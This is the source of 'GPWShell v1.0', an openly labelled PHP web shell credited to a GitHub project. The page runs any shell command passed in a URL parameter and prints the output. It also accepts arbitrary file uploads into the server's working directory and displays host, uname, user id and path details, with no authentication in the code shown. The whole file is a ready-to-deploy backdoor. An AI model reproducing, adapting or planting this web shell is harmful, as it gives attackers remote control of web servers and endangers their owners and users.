<!--                   
               _____ _       _ _ 
 ___ ___ _ _ _|   __| |_ ___| | |
| . | . | | | |__   |   | -_| | |
|_  |  _|_____|_____|_|_|___|_|_|
|___|_| Simple GUI PHP Web Shell  

GPWShell v1.0
Author: Carlos Padilla (cpadlab)
Proyect: https://github.com/cpadlab/GPWShell
-->

<?php

    include 'include/vars.php';
    include 'include/other.php';
    include 'include/get.php';

    if (getURLVar("action") == "command" && getURLVar("command")) {
        $_command_output = execCommand(getURLVar("command"));
    }

    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["action"]) && $_POST["action"] == "submit") {

        if (isset($_FILES["file"]) && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
            move_uploaded_file($_FILES["file"]["tmp_name"], $_pwd . $_FILES["file"]["name"]);
            echo "<script>alert('[Info] The file has been uploaded successfully.');</script>";
        } else {
            echo "<script>alert('[Err] There was an error uploading the file.');</script>";
        }
    }

?>

<!DOCTYPE html>
<html lang="en">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title><?php echo $title?></title>
    <link rel="stylesheet" href="include/style.css">

</head>
<body>
    

    <header>

        <nav>
            <h1><?php echo $title?> <?php echo $version?></h1>
        </nav>

        <nav>
            <a href="https://github.com/cpadlab/GPWShell" target="_blank">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" fill="#e3e3e3"/>
                </svg>
            </a>
            <a href="">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                    <path d="M463.5 224H472c13.3 0 24-10.7 24-24V72c0-9.7-5.8-18.5-14.8-22.2s-19.3-1.7-26.2 5.2L413.4 96.6c-87.6-86.5-228.7-86.2-315.8 1c-87.5 87.5-87.5 229.3 0 316.8s229.3 87.5 316.8 0c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0c-62.5 62.5-163.8 62.5-226.3 0s-62.5-163.8 0-226.3c62.2-62.2 162.7-62.5 225.3-1L327 183c-6.9 6.9-8.9 17.2-5.2 26.2s12.5 14.8 22.2 14.8H463.5z" fill="#e3e3e3"/>
                </svg> 
            </a>
        </nav>

    </header> 

    <hr>

    <main>

        <section class="main-info">

            <div class="mi-item mi-host">
                <label class="mi-label">Host:</label>
                <label for="_mis_host"><?php echo $_host?></label>
            </div>    
        
            <div class="mi-item mi-serv">
                <label class="mi-label">Software:</label>
                <label for="_mis_PHP_version"><?php echo $_software?></label>
            </div>

            <div class="mi-item mi-uname">
                <label class="mi-label">Uname -a:</label>
                <label id="_miu_uname_a"><?php echo $_uname_a?></label>
            </div>

            <div class="mi-item mi-username">
                <label class="mi-label">Id:</label>
                <label id="_miu_username"><?php echo $_username_id?></label>
            </div>

            <div class="mi-item mi-located">
                <label class="mi-label">Located:</label>
                <label id="_miu_located"><?php echo $_located?></label>
            </div>

        </section>

        <hr>

        <section class="main_commands">

            <form id="form_exec_command" method="get">

                <input hidden value="command" name="action">

                <input type="text" placeholder="Command" name="command">
                <input type="submit" value="Exec">

            </form>

            <textarea cols="30" rows="8" readonly><?php echo $_command_output?></textarea>
    
        </section>

        <hr>

        <section class="file_upload" method="get">

            <form id="form_submit_file" method="post">

                <input hidden value="submit" name="action">

                <input type="file" name="file">
                <input type="submit" value="Submit">

            </form>

        </section>

    </main>
    
</body>
</html>